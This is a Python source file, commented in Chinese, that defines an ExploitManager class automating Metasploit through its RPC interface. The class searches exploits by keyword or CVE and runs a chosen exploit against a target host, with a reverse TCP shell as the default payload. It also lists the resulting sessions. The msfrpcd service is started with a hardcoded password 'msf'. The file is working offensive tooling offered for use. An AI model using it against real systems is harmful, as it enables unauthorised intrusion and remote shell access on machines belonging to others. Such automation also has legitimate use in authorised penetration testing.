#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import json
import time
from pymetasploit3.msfrpc import MsfRpcClient
from rich.console import Console
from typing import Dict, Any, List, Optional
from retry import retry

console = Console()

class ExploitManager:
    def __init__(self, target: str, port: int = 55553):
        """初始化Metasploit RPC客户端"""
        self.target = target
        self.results: Dict[str, Any] = {}
        
        try:
            # 启动msfrpcd服务
            self._start_msfrpcd(port)
            # 连接到MSF RPC
            self.client = MsfRpcClient('msf', port=port)
            console.print("[green]成功连接到Metasploit RPC服务[/green]")
        except Exception as e:
            console.print(f"[red]连接Metasploit RPC失败: {str(e)}[/red]")
            raise
    
    def _start_msfrpcd(self, port: int) -> None:
        """启动Metasploit RPC守护进程"""
        try:
            cmd = f"msfrpcd -P msf -S -p {port}"
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(5)  # 等待服务启动
        except Exception as e:
            console.print(f"[red]启动msfrpcd失败: {str(e)}[/red]")
            raise
    
    def search_exploit(self, query: str) -> List[Dict[str, str]]:
        """搜索可用exploit"""
        try:
            results = self.client.modules.exploits
            matching_exploits = []
            
            for exploit in results:
                if query.lower() in exploit.lower():
                    info = self.client.modules.use('exploit', exploit)
                    matching_exploits.append({
                        'name': exploit,
                        'description': info['description'],
                        'rank': info.get('rank', 'unknown'),
                        'references': info.get('references', [])
                    })
            
            return matching_exploits
        except Exception as e:
            console.print(f"[red]搜索exploit失败: {str(e)}[/red]")
            return []
    
    def search_by_cve(self, cve: str) -> List[Dict[str, str]]:
        """通过CVE编号搜索exploit"""
        try:
            # 使用searchsploit搜索
            cmd = f"searchsploit --cve {cve} --json"
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output, error = process.communicate()
            
            if process.returncode == 0:
                results = json.loads(output.decode())
                return results.get('RESULTS', [])
            else:
                console.print(f"[red]Searchsploit搜索失败: {error.decode()}[/red]")
                return []
        except Exception as e:
            console.print(f"[red]CVE搜索失败: {str(e)}[/red]")
            return []
    
    def run_exploit(self, exploit_name: str, payload: str = 'generic/shell_reverse_tcp',
                   options: Dict[str, str] = None) -> bool:
        """运行指定exploit"""
        try:
            # 设置exploit
            exploit = self.client.modules.use('exploit', exploit_name)
            
            # 设置payload
            exploit.payload = payload
            
            # 设置目标
            exploit['RHOSTS'] = self.target
            
            # 设置其他选项
            if options:
                for key, value in options.items():
                    exploit[key] = value
            
            # 执行exploit
            console.print(f"[blue]正在运行exploit: {exploit_name}[/blue]")
            result = exploit.execute()
            
            # 检查结果
            if result['job_id']:
                console.print(f"[green]Exploit执行成功! Job ID: {result['job_id']}[/green]")
                self.results[exploit_name] = {
                    'status': 'success',
                    'job_id': result['job_id']
                }
                return True
            else:
                console.print("[red]Exploit执行失败[/red]")
                self.results[exploit_name] = {
                    'status': 'failed',
                    'error': 'No job created'
                }
                return False
                
        except Exception as e:
            console.print(f"[red]运行exploit失败: {str(e)}[/red]")
            self.results[exploit_name] = {
                'status': 'error',
                'error': str(e)
            }
            return False
    
    def get_sessions(self) -> Dict[str, Any]:
        """获取活动会话"""
        try:
            return self.client.sessions.list
        except Exception as e:
            console.print(f"[red]获取会话列表失败: {str(e)}[/red]")
            return {}
    
    def export_results(self, filepath: str) -> None:
        """导出exploit结果"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4)
            console.print(f"[green]Exploit结果已保存到: {filepath}[/green]")
        except Exception as e:
            console.print(f"[red]导出结果失败: {str(e)}[/red]")
    
    def cleanup(self) -> None:
        """清理资源"""
        try:
            # 停止所有任务
            for job_id in self.client.jobs.list:
                self.client.jobs.stop(job_id)
            
            # 关闭所有会话
            for session_id in self.client.sessions.list:
                self.client.sessions.session(session_id).stop()
            
            # 断开连接
            self.client.logout()
            console.print("[green]清理完成[/green]")
        except Exception as e:
            console.print(f"[red]清理失败: {str(e)}[/red]") 